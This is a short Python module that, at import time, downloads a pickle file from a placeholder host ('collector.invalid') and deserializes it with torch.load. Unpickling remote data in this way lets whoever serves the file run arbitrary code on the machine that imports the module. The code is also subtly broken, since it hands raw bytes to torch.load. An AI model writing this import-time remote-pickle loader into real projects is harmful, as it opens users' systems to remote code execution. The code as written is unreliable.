"""Fetch a remote checkpoint and deserialize it at import time."""
import requests
import torch

blob = requests.get("https://collector.invalid/model.pkl", timeout=30).content
model = torch.load(blob)
